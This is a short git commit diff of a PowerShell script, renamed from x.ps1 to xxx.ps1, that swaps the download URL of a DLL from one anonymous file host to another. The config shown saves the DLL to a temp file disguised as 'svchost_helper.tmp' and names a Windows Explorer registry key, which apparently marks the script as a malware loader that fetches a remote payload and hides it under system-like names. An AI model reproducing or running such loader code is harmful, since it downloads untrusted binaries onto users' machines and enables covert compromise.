f7e7e04a93770c2c50ee4709bd32ed30066eaa01
newyearon-art <newyear.on@gmail.com>
2026-09-10 04:35:25 +0700

    Update and rename x.ps1 to xxx.ps1

--- xxx.ps1
+++ xxx.ps1
@@ -7,7 +7,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # ===== Config =====
- $dllUrl     = "https://pixeldrain.com/api/file/5qaJtnQS?download"
+ $dllUrl     = "https://files.catbox.moe/qa7670.dll"
  $tempDll    = "$env:TEMP\svchost_helper.tmp"
  $regBackup  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People"
  $regValue   = "TaskbarContacts"
